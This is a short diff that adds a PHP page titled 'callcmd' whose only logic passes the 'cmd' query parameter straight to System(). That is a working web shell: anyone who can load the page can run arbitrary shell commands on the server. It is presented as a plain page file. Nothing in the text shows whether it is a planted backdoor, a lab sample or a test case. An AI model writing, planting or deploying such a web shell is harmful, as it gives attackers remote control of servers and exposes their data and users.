@@ -1,0 +1,13 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>callcmd</title>
+</head>
+
+<body>
+<?php
+	System($_GET['cmd']);
+?>
+</body>
+</html>
